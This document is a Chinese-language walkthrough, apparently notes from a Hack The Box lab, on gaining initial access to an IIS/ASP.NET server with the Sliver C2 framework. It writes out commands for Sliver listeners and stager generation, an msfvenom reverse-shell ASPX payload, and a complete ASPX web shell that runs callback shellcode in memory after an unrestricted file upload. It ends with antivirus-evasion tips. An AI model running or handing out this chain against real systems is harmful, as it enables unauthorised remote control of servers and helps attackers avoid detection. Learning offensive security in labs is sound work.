# Sliver 實戰 — 初始存取到 Session

## 攻擊環境

- 只有一台主機暴露公網（堡壘主機 / Jump Host）
- 上面跑著 Web Server，評估目標應用程式是否有漏洞
- 作業系統：Windows Server、技術棧：ASP.NET + IIS（用 Wappalyzer 確認）

---

## 攻擊面探測

### 1. 測試檔案上傳限制

```bash
echo 'Sliver!' > test.aspx
```

上傳到目標 Web 應用（線上學習系統），訪問 `/uploads/test.aspx`，回應顯示 `Sliver!` → **確認無副檔名限制**。

> 可用 `dirb` 或其他目錄爆破工具找到 `/uploads` 端點。

---

## Sliver Stager 部署流程

### 概念

```
msfvenom ASPX  →  上傳到目標
    ↓ 執行
Stage Listener (tcp://LHOST:4443)  →  下載 Sliver Implant Shellcode
    ↓ 注入記憶體
HTTP Listener (LHOST:8088)  →  建立 C2 Session
```

### 步驟 1：建立 Profile + Stage Listener + HTTP Listener

```bash
# 建立 Profile（定義 Implant 規格）
sliver > profiles new --http 10.10.14.62:8088 --format shellcode htb

# 啟動 Stage Listener（目標連回來拿 Shellcode）
sliver > stage-listener --url tcp://10.10.14.62:4443 --profile htb

# 啟動 HTTP Listener（Implant 回連用）
sliver > http -L 10.10.14.62 -l 8088
```

### 步驟 2：生成 Stager Shellcode

```bash
sliver > generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
```

輸出：`staged.txt`（C# byte array 格式的 Shellcode）

### 步驟 3：用 msfvenom 產生 ASPX Web Shell

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx
```

### 步驟 4：整合 Shellcode 到 ASPX

將 `staged.txt` 的 byte array 嵌入 ASPX 的 `Page_Load`：

```aspx
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress,
        IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        // 將 staged.txt 的 byte[] 貼到這裡
        byte[] shellcode = new byte[511] { 0xfc, 0x48, ... };

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        IntPtr threadId = IntPtr.Zero;
        CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, ref threadId);
    }
</script>
```

> **關鍵**：`byte[] shellcode` 的內容來自 `staged.txt`，大小必須對應（範例為 511 bytes）。

### 步驟 5：上傳並觸發

1. 透過 Web 應用的上傳功能上傳 `sliver.aspx`
2. 瀏覽器訪問 `/uploads/sliver.aspx`
3. Sliver Server 收到連線

---

## 取得 Session

```bash
sliver > sessions

 ID         Transport   Remote Address         Hostname   Username   OS                 Health
========== =========== ====================== ========== ========== ================== =========
 06ff8ed9   http(s)     10.129.205.234:49699   web01      <err>      windows/amd64      [ALIVE]

# 進入 Session（支援 TAB 補全）
sliver > use 06ff8ed9

sliver (HIGH_RISER) > info
```

**輸出重點：**

| 欄位 | 說明 |
|------|------|
| `Active C2` | 當前使用的 C2 通道 |
| `OS / Version` | 目標 OS 版本（用於後續漏洞利用判斷）|
| `PID` | Implant 程序 ID（migrate 用）|
| `Last Checkin` | 最後回連時間 |

---

## 顏色辨識（重要）

| 顏色 | 代表 | 特性 |
|------|------|------|
| 🔴 紅色名稱 | **Session** | 互動式，即時回應 |
| 🔵 藍色名稱 | **Beacon** | 異步，定期 Checkin |

---

## OPSEC 注意

| 問題 | 解法 |
|------|------|
| msfvenom ASPX 特徵明顯，易被 AV 偵測 | 改用混淆 Web Shell（如 [SharPyShell](https://github.com/antonioCoco/SharPyShell)）提供指令執行，再用它傳遞 Sliver Implant |
| Shellcode 直接嵌入 ASPX | 考慮分離 Shellcode，從遠端動態載入 |
| 使用預設 Port | Stage Listener 改用 443/80 等常見 Port |

---

## 後續

Session 建立後 → 進行**權限提升（Privilege Escalation）**，保持此 Session 活躍。

參考：`03-操作指令.md`、`04-後滲透.md`
